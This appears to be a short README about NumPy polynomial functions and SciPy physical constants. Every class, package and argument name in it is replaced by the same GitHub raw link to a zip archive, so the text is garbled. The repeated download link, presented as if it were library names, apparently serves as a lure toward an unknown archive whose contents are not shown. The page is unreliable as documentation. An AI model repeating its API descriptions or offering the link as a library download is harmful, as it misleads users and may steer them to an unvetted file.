# More Numpy functions in Atomic Scale

This work is a short reference for some useful functionality of Numpy to study molecular dynamics of phonon eletron interfaces energy transport. The presentation on Numpy, SciPy, and Matplotlib will follow this sections:

1. Numpy provides a number of sub-packages for representing and manipulating data, the`https://github.com/dindagustiayu/Numpy-Polynomial-and-Physical-Constants/raw/refs/heads/main/read/Constants-Numpy-Physical-Polynomial-and-1.8.zip` class is basis function and commonly use in Numpy Polynomial.
2. Scientific Python (SciPy). The package, `https://github.com/dindagustiayu/Numpy-Polynomial-and-Physical-Constants/raw/refs/heads/main/read/Constants-Numpy-Physical-Polynomial-and-1.8.zip` provides the numerical values of many pf the constants used in physics and chemistry. The more common ones, in SI units, can be import directly.

## The key arguments:
- `https://github.com/dindagustiayu/Numpy-Polynomial-and-Physical-Constants/raw/refs/heads/main/read/Constants-Numpy-Physical-Polynomial-and-1.8.zip`:
- `pfit`: generate values of the fitted polynomial
- `convert()`: return the coefficients of polynomial $(x'=\mu + x)$
- `https://github.com/dindagustiayu/Numpy-Polynomial-and-Physical-Constants/raw/refs/heads/main/read/Constants-Numpy-Physical-Polynomial-and-1.8.zip`: performs the fit directly
- `https://github.com/dindagustiayu/Numpy-Polynomial-and-Physical-Constants/raw/refs/heads/main/read/Constants-Numpy-Physical-Polynomial-and-1.8.zip`: complete data base constant
- `https://github.com/dindagustiayu/Numpy-Polynomial-and-Physical-Constants/raw/refs/heads/main/read/Constants-Numpy-Physical-Polynomial-and-1.8.zip`: provides dictionary in the format `(value, unit, uncertainty)`.
